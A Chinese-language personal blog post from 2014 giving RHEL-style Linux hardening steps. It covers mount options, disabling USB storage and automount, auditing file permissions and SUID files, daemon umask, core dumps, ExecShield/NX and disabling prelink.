  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2014/11/18/file-permissions-and-masks/" itemprop="url">
                  File Permissions and Masks
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-11-18T00:00:00+08:00" content="2014-11-18">
              2014-11-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2014/11/18/file-permissions-and-masks/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/11/18/file-permissions-and-masks/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>传统Unix安全强烈依赖文件和目录权限来阻止非授权用户读取或更改它们不该存取的文件。根据最小权限原则，配置每个文件，目录和文件系统，只允许必要的存取。</p>
<p>但linux系统有很多文件……本部分适用于系统安全的一些易于更改和测试，且几乎总是适用的权限限制。</p>
<p>注意：以下有些命令搜索文件系统中包含特定字符的文件和目录，这些命令应该在每个<code>ext2</code>或<code>ext3</code>分区上运行。当<code>PART</code>出现在以下某个命令中，表示这个命令应该在每个分区重复运行一次。</p>
<p>以下命令打印给定机器上所有ext2和ext3命令：</p>
<pre><code><span class="title">mount</span> -t ext2,ext3 | awk <span class="string">'{print <span class="variable">$3</span>}'</span>
</code></pre><p>如果用了其它分区类型，更改<code>-t</code>参数。</p>
<h2 id="限制分区挂载参数">限制分区挂载参数</h2><p>系统分区挂载时能指定参数，限制分区上文件能做什么。这些参数在<code>/etc/fstab</code>中设置，这些措施能让特定类型的恶意行为更加困难。</p>
<h3 id="想非Root分区添加nodev选项">想非Root分区添加nodev选项</h3><p>编辑<code>/etc/fstab</code>，我们关注列2(挂载点),3(文件系统类型),4(挂载参数)。给所有满足下列条件的行：</p>
<ul>
<li>文件系统是<code>ext2</code>或<code>ext3</code></li>
<li>挂载点不是<code>/</code></li>
</ul>
<p>在列4添加<code>,nodev</code>。</p>
<p><code>nodev</code>参数防止用户在任何不该挂载设备的分区上挂载设备。只有<code>/dev</code>应该挂载设备，所以不要在<code>/</code>上设置这个参数。</p>
<p>然而，如果系统程序在<code>chroot jail</code>中运行，需要在<code>chroot</code>文件夹内创建设备文件，这个建议就不这么适用。</p>
<h3 id="向可以出存储分区添加nodev，nosuid和noexec选项">向可以出存储分区添加nodev，nosuid和noexec选项</h3><p>编辑<code>/etc/fstab</code>，如果行中包含<code>floppy</code>或者<code>cdrom</code>字样就说明这些是可移除媒体的文件系统。</p>
<p>对其中每个找到的挂载点，在列4添加<code>noexec,nodev,nosuid</code>参数。</p>
<p>挂载到可移除介质的文件系统也为恶意可执行文件提供了潜在的进入系统方式，因此应该用最小权限挂载。用户不能引入任意设备或者suid程序。另外<code>noexec</code>禁止用户直接在可移除介质上运行程序，这能阻止一些特殊蠕虫和恶意代码。</p>
<p><code>/etc/fstab</code>上的挂载点也许在某些典型硬件的现代系统上不存在。动态挂载机制需要通过其它方式控制(也许可以也许不能控制挂载选项)。如果你需要在可移动介质中执行什么，就别加<code>noexec</code>.</p>
<h3 id="向临时存储分区添加nodev，nosuid和noexec参数">向临时存储分区添加nodev，nosuid和noexec参数</h3><p>临时存储分区比如<code>/tmp</code>和<code>/dev/shm</code>为恶意程序执行提供了潜在存储空间。尽管添加这些参数不能防止其它分区的程序解释存储在这些分区的代码，但对某些恶意代码也有作用。</p>
<p>编辑<code>/etc/fstab</code>，向列4添加<code>,nodev,nosuid,noexec</code>。</p>
<h3 id="绑定挂载/var/tmp到/tmp">绑定挂载/var/tmp到/tmp</h3><p>编辑<code>/etc/fstab</code>，添加以下行：</p>
<pre><code>/tmp    /var/tmp    none    rw,noexec,nosuid,nodev,bind <span class="number">0</span> <span class="number">0</span>
</code></pre><p>这一行绑定挂载任何人都可写的<code>/var/tmp</code>目录到<code>/tmp</code>，使用用上文中用的选项。参见mount的man页面获取更多关于绑定挂载的信息。</p>
<h2 id="限制动态挂载和卸载文件系统">限制动态挂载和卸载文件系统</h2><p>linux系统提供了各种措施自动增加和删除运行系统的文件系统，这些措施很方便，也带来了诸如允许非授权用户引入任意文件系统或者，软件自动挂载措施的缺陷允许攻击者侵入系统。</p>
<p>使用这些措施的时候要十分小心，找到更好的配置管理方式和实行用户教育可能减少风险。</p>
<h3 id="限制控制台设备接入">限制控制台设备接入</h3><p>默认系统配置批准控制台用户提升到root用户权限，包括暂时拥有大部分系统设备。如果不必要，禁用这个权限，限制到root。</p>
<p>将设备所有者限定到root</p>
<p>(RHEL6)中并无这些，神奇的消失了。Removed references to 50-default.perms, since this file was removed in Red Hat Enterprise Linux 6, per Bugzilla 630524.</p>
<h3 id="禁用USB设备支持">禁用USB设备支持</h3><p>USB闪存或硬盘可能为攻击者物理接触系统拷贝大量数据提供便利。</p>
<h4 id="禁止内核加载USB存储驱动">禁止内核加载USB存储驱动</h4><p>如果不让用USB设备，<code>modprobe</code>程序应该被设置为不自动加载USB存储驱动。</p>
<pre><code><span class="id">#vi</span> /etc/modprobe.d/no-usb<span class="class">.conf</span>                           <span class="id">#Create</span> this file <span class="keyword">if</span> it doesn’t exist
install usb-storage /bin/true                             <span class="hexcolor">#Add</span> this line
:wq!
</code></pre><p>这可以禁止modprobe加载usb-storage模块，但无法阻止管理员或其它程序使用insmod来加载模块。</p>
<h4 id="移除USB存储驱动">移除USB存储驱动</h4><p>如果根本不需要使用USB存储设备，内核驱动就可以删除。</p>
<pre><code>rm /<span class="class"><span class="keyword">lib</span>/<span class="title">modules</span>/<span class="title">kernelversion</span>(<span class="title">s</span>) /<span class="title">kernel</span>/<span class="title">drivers</span>/<span class="title">usb</span>/<span class="title">storage</span>/<span class="title">usb</span>-<span class="title">storage</span>.<span class="title">ko</span></span>
</code></pre><p>每次更新内核后都要运行这个命令。<code>rpm -q --verify kernel</code>也会失败，不好的副作用。</p>
<p>注意，如果一个带有usb驱动的自制内核被使用，该方法并不能防止USB存储设备被挂载。</p>
<h4 id="在启动时禁用对USB的内核支持">在启动时禁用对USB的内核支持</h4><p>在内核启动参数中加入<code>nousb</code>参数</p>
<p>注意！！！！！！！！！！！：这会让usb外接键盘鼠标打印机等设备无法使用。</p>
<p>在<code>/etc/grub.conf</code>中加入<code>nousb</code>参数：</p>
<pre><code>kernel <span class="regexp">/vmlinuz-version ro vga=ext root=/</span>dev<span class="regexp">/VolGroup00/</span>LogVol00 rhgb quiet nousb
</code></pre><h4 id="禁止从USB设备启动">禁止从USB设备启动</h4><p>配置BIOS禁止从USB启动，设置BIOS或固件密码防止非授权的更改配置。</p>
<h3 id="尽量禁用自动挂载">尽量禁用自动挂载</h3><p>如果<code>autofs</code>服务不是必要的，比如挂载NFS文件系统或可移动介质，禁用该服务。</p>
<pre><code><span class="title">chkconfig</span> autofs <span class="built_in">off</span>
</code></pre><p>其实用autofs自动挂载可移动介质也不常见，如果不用NFS就禁用服务。</p>
<p>就算需要NFS，近乎总是可能在<code>/etc/fstab</code>配置静态文件系统挂载，而不是依靠自动挂载。</p>
<h3 id="尽量禁用gnome自动挂载">尽量禁用gnome自动挂载</h3><p>略</p>
<h3 id="禁止挂载不常见文件系统类型">禁止挂载不常见文件系统类型</h3><p>在<code>/etc/modprobe.d/</code>下随意建个文件比如<code>uncomman_fs.conf</code>:</p>
<pre><code><span class="operator"><span class="keyword">install</span> cramfs /<span class="keyword">bin</span>/<span class="literal">true</span>
<span class="keyword">install</span> freevxfs /<span class="keyword">bin</span>/<span class="literal">true</span>
<span class="keyword">install</span> jffs2 /<span class="keyword">bin</span>/<span class="literal">true</span>
<span class="keyword">install</span> hfs /<span class="keyword">bin</span>/<span class="literal">true</span>
<span class="keyword">install</span> hfsplus /<span class="keyword">bin</span>/<span class="literal">true</span>
<span class="keyword">install</span> squashfs /<span class="keyword">bin</span>/<span class="literal">true</span>
<span class="keyword">install</span> udf /<span class="keyword">bin</span>/<span class="literal">true</span></span>
</code></pre><h3 id="尽可能禁用所有Gnome缩略图">尽可能禁用所有Gnome缩略图</h3><h2 id="确认重要文件和目录权限">确认重要文件和目录权限</h2><p>讨论了需要日常检查以确保没有有害的差异发生。</p>
<h3 id="确认passwd，shadow，group和gshadow文件的权限">确认passwd，shadow，group和gshadow文件的权限</h3><pre><code>cd /etc
chown root:root passwd shadow <span class="keyword">group</span> <span class="title">gshadow</span>
chmod <span class="number">644</span> passwd <span class="keyword">group</span>
<span class="title">chmod</span> <span class="number">400</span> shadow gshadow
</code></pre><p>一般这是默认情况。</p>
<h3 id="确认所有全局可写的目录设置sticky位">确认所有全局可写的目录设置sticky位</h3><p>找到所有本地分区上全局可写但未设置sticky位的文件夹。以下命令可以用来查找，其中<code>PART</code>是指定分区：</p>
<pre><code><span class="built_in">find</span> PART -xdev -<span class="built_in">type</span> d \( -perm -<span class="number">0002</span> -a ! -perm -<span class="number">1000</span> \) -<span class="built_in">print</span>
</code></pre><p>如果有任何输出目录<code>/dir</code>，用以下命令更改：</p>
<pre><code>chmod +t /<span class="built_in">dir</span>
</code></pre><p>sticky位设置后，只有文件夹的所有者可以删除其中的文件。</p>
<h3 id="发现为授权的全局可写文件">发现为授权的全局可写文件</h3><p>以下命令找到全局可写文件(对某一分区<code>PART</code>)：</p>
<pre><code><span class="built_in">find</span> PART -xdev -<span class="built_in">type</span> f -perm -<span class="number">0002</span> -<span class="built_in">print</span>
</code></pre><p>如果发现确实不该设置全局可写，设置：</p>
<pre><code>chmod o-w <span class="type">file</span>
</code></pre><p>几乎不该出现全局可写的文件夹。</p>
<h3 id="找到未授权的SUID/SGID系统可执行文件">找到未授权的SUID/SGID系统可执行文件</h3><p>以下命令找到所有分区<code>PART</code>上的setuid和setgid文件：</p>
<pre><code><span class="built_in">find</span> PART -xdev \( -perm -<span class="number">4000</span> -o -perm -<span class="number">2000</span> \) -<span class="built_in">type</span> f -<span class="built_in">print</span>
</code></pre><p>如果确定有不用设置suid或sgid的程序，设置：</p>
<pre><code>chmod -s <span class="type">file</span>
</code></pre><p>可以参考NSA Guide 32页表格决定。</p>
<h3 id="找到和修复无主文件">找到和修复无主文件</h3><p>找到分区<code>PART</code>不属于任何有效用户组和用户的文件：</p>
<pre><code>find PART -xdev <span class="string">\(</span> -nouser -o -nogroup <span class="string">\)</span> -<span class="built_in">print</span>
</code></pre><p>如果有输出检查下是分配给某个用户和组还是删除文件。</p>
<p>通常无主文件并不可被挖掘漏洞，但是通常意味系统进程出错。也许是一个入侵者造成的，或者不正确的软件安装或者不完整的软件移除，或者移除一个被删除的帐号失败。这些文件应该被修复，以防将来创建用户出现问题，因此这种问题需要重视。</p>
<h3 id="确保所全局可写目录有合适的权限">确保所全局可写目录有合适的权限</h3><p>确保全局可写文件目录的权限是root或者其它系统账户。以下命令将发现和打印这些：</p>
<pre><code><span class="built_in">find</span> PART -xdev -<span class="built_in">type</span> d -perm -<span class="number">0002</span> -uid +<span class="number">500</span> -<span class="built_in">print</span>
</code></pre><p>如果有输出，搞明白为什么这些全局可写目录的拥有者不是root或者系统账户。</p>
<p>允许用户账户拥有全局可写目录不合适，应该这将允许拥有者移除任何其它用户放进去的文件。</p>
<h2 id="限制以危险模式运行的程序">限制以危险模式运行的程序</h2><p>这部分推荐提供广泛的保护，防止信息泄漏或者其它不当行为。这些保护被应用在系统初始化时和内核层，以抵御特定类型的没配置好或被入侵的程序。</p>
<h3 id="设置daemon_umask">设置daemon umask</h3><p>编辑<code>/etc/sysconfig/init</code>，添加或改变以下行。</p>
<pre><code><span class="built_in">umask</span> <span class="number">027</span>
</code></pre><p>该文件包含在启动时应用到所有进程的设置。最起码系统umask是022,不然守护进程就会创建全局可写的文件。更严格的027保护临时文件、日志文件等不被未授权的非授权用户读取。</p>
<p>如果特定daemon需要更宽松的umask，考虑为该守护进程单独设置例外，比如编辑启动脚本或者sysconfig文件</p>
<h3 id="禁用吐核">禁用吐核</h3><p>在<code>/etc/security/limits.conf</code>中添加或更改以下行，限制所有用户吐核。</p>
<pre><code><span class="bullet">*   </span>hard core 0
</code></pre><p>并且，确保setuid程序不吐核，编辑<code>/etc/sysctl.conf</code>添加或改正以下行：</p>
<pre><code>fs<span class="class">.suid_dumpable</span> = <span class="number">0</span>
</code></pre><p>核文件是可执行文件的内存镜像，大多情况下只有开发者需要合法的存取这些文件。核内可能包含敏感信息或者占据大量磁盘空间。</p>
<p>默认情况下，系统设置了软限制(soft limit)，以防止所有用户创建核文件。通过在<code>/etc/profile</code>中以下行实现：</p>
<pre><code>ulimit -S -c <span class="number">0</span> &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span>
</code></pre><p>然而这个限制不是强制的。仅能防止对用户会话中恼人的吐核，如果需要吐核，考虑限定到指定用户和组。参见<code>limit.conf</code>的man页面。</p>
<h4 id="确保禁止suid吐核">确保禁止suid吐核</h4><p>使用<code>sysctl</code>检查：</p>
<pre><code><span class="tag">sysctl</span> <span class="tag">fs</span><span class="class">.suid_dumpable</span>
</code></pre><p>使用<code>-n</code>参数更利于写脚本检查这个值。</p>
<h4 id="开启ExecShield">开启ExecShield</h4><p>ExecShield包含一系列内核特性，这些特性提供缓冲区移除攻击保护。这些特性包括随机放置栈和其它内存区域，阻止在应该放数据的区段中执行内存，对字符缓冲区特殊处理。</p>
<p>为了让这些在启动时激活，添加以下行到<code>/etc/sysctl.conf</code>:</p>
<pre><code>kernel<span class="class">.exec-shield</span> = <span class="number">1</span>
kernel<span class="class">.randomize_va_space</span> = <span class="number">2</span>
</code></pre><p>Execshield 使用所有x86平台的段特性来阻止内存中特定地址更高的地址执行。它在代码段描述符中写下一个地址作为限制，来控制代码在哪里能执行(对每一个进程的基础上)。当内核将一个进程的内存区域，比如对或者栈到高于这个地址时，硬件会阻止它执行。然而，不可能对所有不该执行的内存区域做到这点。<code>randomize_va_space</code>值为2一般为默认值，确保随机放置栈,、VDSO页面,、共享内存区域和数据段。</p>
<h4 id="确保ExecShield已经启用">确保ExecShield已经启用</h4><p>使用sysctl确认当前系统中使用了这些特性：</p>
<pre><code><span class="tag">sysctl</span> <span class="tag">kernel</span><span class="class">.exec-shield</span>
<span class="tag">sysctl</span> <span class="tag">kernel</span><span class="class">.randomize_va_space</span>
</code></pre><h3 id="启用32位系统的Execute_Disable(XD)或者No_Execute(NX)支持">启用32位系统的Execute Disable(XD)或者No Execute(NX)支持</h3><p>较新的x86 32位处理器支持在每个内存页面基础上的代码防止执行。通常在AMD处理器上这个特性嗯叫<code>NX</code>，在Intel处理器中叫<code>XD</code>。这个特性有助于防止缓冲区移除攻击。任何时候都该开启。其它处理器比如Itanium、Power和64位x86处理器开始就支持该特性。</p>
<h4 id="检查是否处理器支持">检查是否处理器支持</h4><p>检查是否支持<code>PAE</code>和<code>NX</code>特性：</p>
<pre><code>cat /<span class="keyword">proc</span>/cpuinfo
</code></pre><p>如果支持，<code>flags</code>域内包含<code>pae</code>和<code>nx</code>。</p>
<h4 id="在x86系统安装新内核">在x86系统安装新内核</h4><p>显然64位系统用不着<code>PAE</code>特性。<code>kernel-PAE</code>顺便开启了<code>NX</code>或<code>XD</code>支持。不要在cpu不支持这些特性的机器上装<code>kernel-PAE</code>：</p>
<pre><code>yum <span class="keyword">install</span> kernel-PAE
</code></pre><h4 id="在BIOS中开启NX或XD支持">在BIOS中开启NX或XD支持</h4><p>进入BIOS设置界面，一概在setup菜单，security部分，大概</p>
<h3 id="配置prelink">配置prelink</h3><p>通过加载每个已经链接的必要符号的共享库到相同的位置，Prelink设计来减少进程启动时间。<code>/etc/sysconfig/prelink</code>文件描述了<code>/usr/sbin/prelink</code>程序会改动哪些文件以及更改这些文件的频率。</p>
<p>cron任务可以每天运行来执行<code>prelink</code>程序，有两种类型的预链接：quick和full，full默认每十四天发生一次，重链接所有共享库和那些使用它们的二进制文件。快速模式每天运行，但只对改动的二进制文件和库进行。</p>
<p>一旦二进制文件被预链接了，共享库地址不再会在进程基础上随机防止，就算<code>kernel.randomize_va_space</code>设置成1或2.这可不是我们想要的结果，由于其为攻击者的挖掘尝试提供了稳定的地址。</p>
<h4 id="禁用prelink">禁用prelink</h4><p>配置<code>/etc/sysconfig/prelink</code>:</p>
<pre><code><span class="setting">PRELINKING=<span class="value"><span class="keyword">no</span></span></span>
</code></pre><h4 id="取消已经存在的预链接">取消已经存在的预链接</h4><p>执行以下命令：</p>
<pre><code><span class="regexp">/usr/</span>sbin<span class="regexp">/prelink -ua</span>
</code></pre>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">178</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">63</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lazymind.me/" target="_blank">mapleray</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/4/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
